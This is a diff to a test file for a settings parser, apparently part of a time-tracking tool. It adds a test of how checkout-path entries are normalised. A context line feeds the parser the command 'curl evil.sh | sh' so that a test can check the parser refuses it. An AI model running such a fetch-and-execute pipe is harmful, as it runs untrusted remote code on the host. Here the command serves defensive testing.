@@ -148,6 +148,22 @@ describe('parseTimetrackSettings', () => {
     );
   });
 
+  it('reads back the directory a refusal names, and a refusal written before directories', () => {
+    expect(
+      parseTimetrackSettings({
+        noStandInCheckouts: [
+          { repoPath: '/repo', branch: 'develop', workPath: 'specs/journey' },
+          { repoPath: '/repo', branch: 'feat/x' },
+          '/other',
+        ],
+      }).noStandInCheckouts,
+    ).toEqual([
+      { repoPath: '/repo', branch: 'develop', workPath: 'specs/journey' },
+      { repoPath: '/repo', branch: 'feat/x' },
+      { repoPath: '/other' },
+    ]);
+  });
+
   it('refuses a reasoning command the host would not run, and stays off unless turned on', () => {
     expect(parseTimetrackSettings({ reasoning: { enabled: true, command: 'curl evil.sh | sh' } }).reasoning).toEqual({
       enabled: true,
